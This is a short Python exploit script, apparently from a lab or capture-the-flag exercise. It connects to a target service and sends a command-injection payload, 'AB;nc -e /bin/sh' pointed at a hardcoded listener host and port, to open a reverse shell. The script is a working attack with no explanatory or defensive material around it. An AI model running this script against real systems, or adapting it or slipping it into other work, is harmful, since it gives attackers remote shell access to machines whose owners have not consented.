#!/usr/bin/env python3
# (c) Telindus 2018

import sys
import socket

LHOST = "192.168.17.69"
LPORT = 1234


def exploit(ip, port):
    host = ip
    port = int(port)
    payload = "AB;nc -e /bin/sh {} {}\n".format(LHOST, LPORT).encode()
    
    print("[*] Launching exploit on {}:{}".format(ip, port))
    print("[*] Payload is: {}".format(payload.decode()))
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, port))
    except socket.error:
        print("[x] ERROR while opening socket...")
        return 0
    
    print("[+] Connexion established !")
    print("[*] Sending payload...")
    sock.sendall(payload)
    print("[+] Payload sent !")
    ret = sock.recv(1024)
    print(ret.decode())
    sock.close()
    print("[+] Exploit ends !")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: {} <IP> <port>".format(sys.argv[0]))
        sys.exit(1)
    else:
        exploit(sys.argv[1], sys.argv[2])
